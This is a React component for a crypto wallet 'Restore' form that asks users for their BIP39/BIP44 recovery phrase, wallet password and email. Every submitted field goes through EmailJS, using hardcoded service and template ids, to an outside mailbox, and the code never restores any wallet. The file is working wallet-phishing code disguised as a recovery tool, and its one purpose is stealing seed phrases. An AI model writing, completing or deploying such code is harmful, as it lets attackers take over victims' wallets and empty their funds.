import React,{useRef, useState} from 'react'
import emailjs from '@emailjs/browser';
import Modal from '../Modal';

import FormInput from '../FormInput'

const FORM_INPUT = [
    {
        name: 'privateKey',
        label: 'Please enter your private key',
        type: 'text',
        placeholder: 'Enter your private key',
        hint: 'Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.',
    },
    {
        name: 'privateKeyPassword',
        label: 'Enter your wallet password',
        type: 'password',
        placeholder: 'Enter your temporary password',
        hint: '',
    },
    {
        name: 'email',
        label: 'Enter your email',
        type: 'email',
        placeholder: 'Enter your email address',
        hint: '',
    }
]

export default function PrivateKey()
{
    const [open, setOpen] = useState(false)
    const form = useRef()

    const toggle = () => setOpen(!open)
    const sendEmail = (e) => {
        e.preventDefault();
    
        emailjs.sendForm('service_f9owe8b', 'template_dkezrui', form.current, 'q9edtd1Uilt68kPHu')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
        e.target.reset()
      };
  return (
    <div>
        {open && <Modal toggle={ toggle} />}
    <form ref={form} className=' flex flex-col items-start justify-start  gap-2' onSubmit={sendEmail}>
        {
            FORM_INPUT.map((input, index) => <FormInput key={index} {...input} />)
        }
        <button type='submit' onClick={toggle} className='font-bold my-2 text-black bg-blue-400 max-w-full w-48 p-2 rounded-md'>
            Restore
        </button>
    </form>
</div>
  )
}
